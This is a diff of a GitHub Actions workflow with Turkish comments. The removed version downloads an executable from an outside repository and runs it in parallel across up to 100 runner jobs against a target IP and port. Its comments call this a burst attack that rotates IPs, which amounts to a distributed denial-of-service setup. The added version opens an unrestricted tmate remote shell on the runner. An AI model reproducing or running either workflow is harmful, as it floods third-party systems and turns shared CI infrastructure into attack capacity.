@@ -1,31 +1,15 @@
-name: TekPoyraz - BLITZKRIEG (255x IP ROTATION) 😈
+name: TekPoyraz - CANLI TERMINAL 😈
 
 on:
   workflow_dispatch:
 
 jobs:
-  blitz:
+  terminal:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      max-parallel: 20 # GitHub'ın aynı anda izin verdiği eşzamanlı IP sınırı
-      matrix:
-        # Tam 255'lik ordu. GitHub limitlerini milimetrik zorluyoruz.
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
-
+    # Sadece 1 makine açıyoruz, kafan karışmasın
     steps:
-      - name: Prep
-        run: |
-          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O 5
-          chmod +x 5
-
-      - name: Burst Attack
-        run: |
-          # 10 saniye boyunca 8 koldan mermi basıyoruz
-          for i in {1..8}; do
-             sudo timeout 60 ./5 "$IP" "$PORT" 500 1000 99999 "$TIME" &
-          done
-          
-          # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
-          sleep 12
-          echo "Node ${{ matrix.node }} bitti, yeni IP'ye geçiliyor..."
+      - name: Makineyi Hazırla ve Bekle
+        uses: mxschmitt/action-tmate@v3
+        with:
+          # Bağlandığında terminalin kapanmaması için limit koymuyoruz
+          limit-access-to-actor: false
